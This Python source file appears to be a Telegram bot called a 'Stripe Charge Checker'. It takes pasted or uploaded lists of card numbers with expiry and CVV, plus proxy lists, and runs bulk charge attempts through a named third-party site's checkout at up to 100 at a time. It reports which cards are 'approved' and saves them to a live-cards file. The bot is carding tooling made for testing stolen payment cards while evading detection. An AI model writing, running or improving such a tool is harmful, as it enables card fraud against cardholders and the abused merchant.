"""
Telegram Bot - Stripe Charge Checker
Charges cards through gospelpianosimple.com/checkout
"""
import os
import sys
import io
import asyncio
import json
import logging
import tempfile
import random
import aiohttp
from aiohttp import web
from datetime import datetime

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

import stripe_checker as checker

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
PORT = int(os.environ.get("PORT", 8080))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
CREDIT = "Credits By:@Poriot_ke"

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

sessions: dict = {}

def session(uid: int) -> dict:
    if uid not in sessions:
        sessions[uid] = {"cards": [], "proxies": [], "results": [], "running": False}
    return sessions[uid]

def save_approved_card(result: dict):
    os.makedirs("approved_cards", exist_ok=True)
    with open("approved_cards/live.txt", "a") as f:
        f.write("%s | %s | %s\n" % (result['cc'], result.get('response', ''),
                                     result.get('charge_id', '')))

def parse_card_lines(text: str):
    valid = []
    skipped = 0
    for line in text.strip().split("\n"):
        line = line.strip()
        if not line:
            continue
        parts = line.split("|")
        if len(parts) == 4:
            valid.append(line)
        else:
            skipped += 1
    return valid, skipped

def parse_proxy_lines(text: str):
    proxies = []
    for line in text.strip().split("\n"):
        proxy = checker.parse_proxy_line(line)
        if proxy:
            proxies.append(proxy)
    return proxies


# ──────────────────────────── handlers ─────────────────────────────

async def error_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error("Update %s caused error %s", update, ctx.error)


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Stripe Charge Checker\n\n"
        "/sh cc|mm|yy|cvv - Single charge check\n"
        "/check [N] - Mass charge check (live progress)\n"
        "/bin <BIN> - BIN lookup\n"
        "/results - Show approved charges\n"
        "/status - Session status\n"
        "/clear - Reset session\n\n"
        "Upload .txt files (cards or proxies)\n"
        "%s" % CREDIT
    )


async def cmd_sh(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text(
            "Usage: /sh cc|mm|yy|cvv\n"
            "Example: /sh 4242424242424242|12|2026|123"
        )
        return

    raw = " ".join(ctx.args).strip()
    parts = raw.replace("|", " ").split()
    if len(parts) != 4:
        parts2 = raw.split("|")
        if len(parts2) == 4:
            parts = parts2
        else:
            await update.message.reply_text("Invalid format. Use: cc|mm|yy|cvv")
            return

    cc, mes, ano, cvv = parts
    msg = await update.message.reply_text(
        "Charging %s******%s..." % (cc[:6], cc[-4:])
    )

    try:
        result = await checker.check_card(cc, mes, ano, cvv)
    except Exception as e:
        await msg.edit_text("Error: %s" % str(e))
        logger.exception("check_card failed")
        return

    emoji = "[+]" if result.get("is_live") else "[-]"
    label = "APPROVED" if result.get("is_live") else "DECLINED"
    text = "%s %s\n\nCard: %s\nResponse: %s" % (
        emoji, label, result['cc'], result.get('response', 'N/A')
    )
    charge_id = result.get('charge_id', '')
    if charge_id:
        text += "\nCharge: %s" % charge_id

    await msg.edit_text(text)

    if result.get("is_live"):
        save_approved_card(result)


async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)

    if s["running"]:
        await update.message.reply_text(
            "Already running! Wait or use /clear."
        )
        return

    concurrency = 10
    if ctx.args:
        try:
            concurrency = max(1, min(int(ctx.args[0]), 100))
        except ValueError:
            pass

    cards_to_check = []
    reply_msg = update.message.reply_to_message
    if reply_msg and reply_msg.text:
        cards_to_check, skipped = parse_card_lines(reply_msg.text)

    if not cards_to_check:
        cards_to_check = list(s["cards"])

    if not cards_to_check:
        await update.message.reply_text(
            "No cards to check.\n"
            "Paste cards, reply /check.\n"
            "Or load with /addcards first."
        )
        return

    s["running"] = True
    s["results"] = []

    if reply_msg and reply_msg.text:
        s["cards"].extend(cards_to_check)

    msg = await update.message.reply_text(
        "Charging %d card%s..." % (
            len(cards_to_check), 's' if len(cards_to_check) != 1 else ''
        )
    )

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tmp:
        tmp_path = tmp.name
        for c in cards_to_check:
            tmp.write(c + "\n")

    approved = []
    live_results = []
    proxies = s["proxies"] if s["proxies"] else []
    total = len(cards_to_check)

    async def on_card_result(result, completed, total):
        nonlocal approved, live_results, msg
        is_live = result.get("is_live", False)
        live_results.append(result)
        if is_live:
            approved.append(result)
        emoji = "[+]" if is_live else "[-]"
        resp = result.get("response", "")
        cc = result.get("cc", "?")
        lines = [
            "Live Check - %d/%d" % (completed, total),
            "Latest: %s %s" % (emoji, cc),
            "  -> %s" % resp,
            "",
            "Approved: %d" % len(approved),
            "Declined: %d" % (completed - len(approved)),
            "Remaining: %d" % (total - completed),
        ]
        if approved:
            lines.append("")
            lines.append("Approved charges:")
            for a in approved[-3:]:
                lines.append("  [+] %s - %s" % (a['cc'], a.get('response', '')[:40]))
        try:
            await msg.edit_text("\n".join(lines))
        except Exception:
            pass

    try:
        results = await checker.mass_check(
            tmp_path,
            proxies=proxies,
            concurrency=concurrency,
            progress_callback=on_card_result,
        )
        s["results"] = results
        declined = len(results) - len(approved)

        for r in approved:
            save_approved_card(r)

        parts = ["Done!\n"]
        parts.append("Checked: %d" % len(results))
        parts.append("Approved: %d" % len(approved))
        parts.append("Declined: %d" % declined)

        if approved:
            parts.append("")
            parts.append("Approved charges:")
            for r in approved[:5]:
                cid = r.get('charge_id', '')
                parts.append("  %s - %s" % (r['cc'], r['response'][:50]))
            if len(approved) > 5:
                parts.append("  ... +%d more. Use /results." % (len(approved) - 5))

        await msg.edit_text("\n".join(parts))
    except Exception as e:
        await msg.edit_text("Error: %s" % str(e))
        logger.exception("Check failed")
    finally:
        os.unlink(tmp_path)
        s["running"] = False


async def cmd_results(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    approved = [r for r in s["results"] if r.get("is_live")]
    if not approved:
        await update.message.reply_text("No approved charges yet. Run /check.")
        return

    lines = []
    for i, r in enumerate(approved, 1):
        cid = r.get('charge_id', '')
        line = "%d. %s - %s" % (i, r['cc'], r['response'][:60])
        if cid:
            line += " | %s" % cid
        lines.append(line)

    full = "Approved Charges\n\n" + "\n".join(lines)
    for i in range(0, len(full), 3900):
        await update.message.reply_text(full[i:i+3900])


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    approved = sum(1 for r in s["results"] if r.get("is_live"))
    checked = len(s["results"])
    await update.message.reply_text(
        "Session Status\n\n"
        "Cards loaded: %d\n"
        "Proxies loaded: %d\n"
        "Running: %s\n"
        "Approved: %d\n"
        "Checked: %d" % (
            len(s['cards']), len(s['proxies']),
            'Yes' if s['running'] else 'No',
            approved, checked
        )
    )


async def cmd_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    s["cards"] = []
    s["proxies"] = []
    s["results"] = []
    s["running"] = False
    await update.message.reply_text("Session cleared.")


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Stripe Charge Checker Commands\n\n"
        "/sh cc|mm|yy|cvv - Single charge attempt\n"
        "/check [N] - Mass check with live progress\n"
        "/bin <BIN> - BIN lookup\n"
        "/results - Show approved charges\n"
        "/status - Session status\n"
        "/addcards - Load cards from replied msg\n"
        "/addproxy - Load proxies from replied msg\n"
        "/saved - Show saved approved cards\n"
        "/clear - Reset session\n\n"
        "Upload .txt - auto-detect cards or proxies\n"
        "%s" % CREDIT
    )


async def cmd_saved(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        with open("approved_cards/live.txt", "r") as f:
            content = f.read().strip()
        if not content:
            raise FileNotFoundError
        await update.message.reply_text("Saved Approved Charges\n\n%s" % content[-3500:])
    except FileNotFoundError:
        await update.message.reply_text("No saved charges yet.")


async def cmd_addcards(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    reply = update.message.reply_to_message
    if not reply or not reply.text:
        await update.message.reply_text("Reply to a message with card data.")
        return
    cards, skipped = parse_card_lines(reply.text)
    if not cards:
        await update.message.reply_text("No valid cards found.")
        return
    s["cards"].extend(cards)
    text = "%d card%s loaded." % (len(cards), 's' if len(cards) != 1 else '')
    if skipped:
        text += " Skipped %d line(s)." % skipped
    await update.message.reply_text(text)


async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    reply = update.message.reply_to_message
    if not reply or not reply.text:
        await update.message.reply_text("Reply to a message with proxy data.")
        return
    proxies = parse_proxy_lines(reply.text)
    if not proxies:
        await update.message.reply_text("No valid proxies found.")
        return
    s["proxies"].extend(proxies)
    await update.message.reply_text(
        "%d %s loaded. Total: %d proxies." % (
            len(proxies), 'proxy' if len(proxies) == 1 else 'proxies',
            len(s['proxies'])
        )
    )


async def cmd_bin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text("Usage: /bin <BIN>")
        return
    bin_num = ctx.args[0].strip()[:6]
    if not bin_num.isdigit():
        await update.message.reply_text("BIN must be digits.")
        return

    msg = await update.message.reply_text("Looking up BIN %s..." % bin_num)
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get("https://lookup.binlist.net/%s" % bin_num) as resp:
                if resp.status == 200:
                    data = await resp.json()
                elif resp.status == 429:
                    await msg.edit_text("Rate limited. Try again.")
                    return
                else:
                    await msg.edit_text("BIN lookup failed (HTTP %d)" % resp.status)
                    return
    except Exception as e:
        await msg.edit_text("Error: %s" % str(e))
        return

    scheme = data.get("scheme", "N/A") or "N/A"
    brand = data.get("brand", "N/A") or "N/A"
    type_ = data.get("type", "N/A") or "N/A"
    prepaid = "Yes" if data.get("prepaid") else "No"
    country_name = (data.get("country") or {}).get("name", "N/A") or "N/A"
    country_code = (data.get("country") or {}).get("alpha2", "") or ""
    bank_name = (data.get("bank") or {}).get("name", "N/A") or "N/A"
    bank_url = (data.get("bank") or {}).get("url", "") or ""
    bank_phone = (data.get("bank") or {}).get("phone", "") or ""

    lines = [
        "BIN Lookup: %s" % bin_num,
        "",
        "Scheme: %s" % scheme,
        "Brand: %s" % brand,
        "Type: %s" % type_,
        "Prepaid: %s" % prepaid,
        "Country: %s %s" % (country_name, country_code),
        "Bank: %s" % bank_name,
    ]
    if bank_url:
        lines.append("URL: %s" % bank_url)
    if bank_phone:
        lines.append("Phone: %s" % bank_phone)
    if not data.get("bank"):
        lines.append("")
        lines.append("No bank details available.")
    lines.append("")
    lines.append(CREDIT)

    await msg.edit_text("\n".join(lines))


async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    doc = update.message.document

    if not doc.file_name or not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please upload a .txt file.")
        return

    file = await doc.get_file()
    content = await file.download_as_bytearray()
    text = content.decode("utf-8", errors="ignore")

    cards, skipped = parse_card_lines(text)
    if cards:
        s["cards"].extend(cards)
        parts = ["%d %s loaded from %s" % (
            len(cards), 'card' if len(cards) == 1 else 'cards', doc.file_name)]
        if skipped:
            parts.append("Skipped %d line(s)." % skipped)
        parts.append("Total: %d cards. Reply /check to run." % len(s['cards']))
        await update.message.reply_text("\n".join(parts))
        return

    proxies = parse_proxy_lines(text)
    if proxies:
        s["proxies"].extend(proxies)
        label = "proxy" if len(proxies) == 1 else "proxies"
        await update.message.reply_text(
            "%d %s loaded from %s\nTotal: %d proxies." % (
                len(proxies), label, doc.file_name, len(s['proxies'])
            )
        )
        return

    await update.message.reply_text("No valid cards or proxies found.")


# ───────────────────────────── main ────────────────────────────────

def start_health_server():
    app = web.Application()
    async def health(request):
        return web.Response(text="OK")
    app.router.add_get("/", health)
    return app


async def async_main() -> None:
    bot_app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()

    bot_app.add_handler(CommandHandler("start", cmd_start))
    bot_app.add_handler(CommandHandler("help", cmd_help))
    bot_app.add_handler(CommandHandler("sh", cmd_sh))
    bot_app.add_handler(CommandHandler("check", cmd_check))
    bot_app.add_handler(CommandHandler("bin", cmd_bin))
    bot_app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    bot_app.add_handler(CommandHandler("addcards", cmd_addcards))
    bot_app.add_handler(CommandHandler("results", cmd_results))
    bot_app.add_handler(CommandHandler("status", cmd_status))
    bot_app.add_handler(CommandHandler("saved", cmd_saved))
    bot_app.add_handler(CommandHandler("clear", cmd_clear))
    bot_app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
    bot_app.add_error_handler(error_handler)

    health_app = start_health_server()
    runner = web.AppRunner(health_app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info("Health check server on 0.0.0.0:%d", PORT)

    await bot_app.bot.delete_webhook(drop_pending_updates=True)
    logger.info("Cleared stale webhook")
    await asyncio.sleep(0.5)

    await bot_app.initialize()
    await bot_app.start()
    await bot_app.updater.start_polling(drop_pending_updates=True)
    logger.info("Bot polling started")

    try:
        await asyncio.Event().wait()
    finally:
        await bot_app.stop()
        await runner.cleanup()


def main() -> None:
    asyncio.run(async_main())


if __name__ == "__main__":
    main()
